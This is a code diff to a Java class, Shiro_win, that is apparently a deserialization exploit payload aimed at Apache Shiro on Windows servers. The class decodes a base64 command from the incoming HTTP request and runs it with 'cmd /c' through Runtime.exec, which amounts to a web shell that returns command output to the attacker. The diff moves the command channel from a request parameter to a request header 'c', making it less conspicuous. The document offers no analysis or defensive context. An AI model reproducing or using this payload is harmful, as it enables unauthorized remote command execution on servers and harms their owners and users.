@@ -28,9 +28,9 @@ public class Shiro_win extends AbstractTranslet implements Serializable {
             HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();
 
             // exexute shell to base64
-            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getParameter("c")));
+            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getHeader("c")));
 
-            // String[] command = {"cmd", "/c", httprequest.getParameter("c")};
+            // String[] command = {"cmd", "/c", httprequest.getHeader("c")};
             InputStream in = Runtime.getRuntime().exec(new String[]{"cmd", "/c", params}).getInputStream();
 
             Scanner scan = new Scanner(in).useDelimiter("\\A");
